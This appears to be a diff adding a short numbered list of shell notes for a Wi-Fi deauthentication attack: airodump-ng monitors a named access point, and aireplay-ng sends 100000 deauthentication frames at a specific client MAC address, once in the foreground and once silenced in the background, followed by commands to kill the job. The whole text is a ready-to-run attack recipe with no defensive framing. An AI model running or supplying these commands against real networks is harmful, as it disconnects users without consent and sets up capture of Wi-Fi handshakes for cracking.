@@ -1,0 +1,13 @@
+1) airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2
+
+2) aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c 00:21:27:FD:61:06 mon0
+
+3) aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c 00:21:27:FD:61:06 mon0 &> /dev/null $
+
+4) jobs
+
+5) killall aireplay-ng 
+
+6) kill %1
+
+7) 
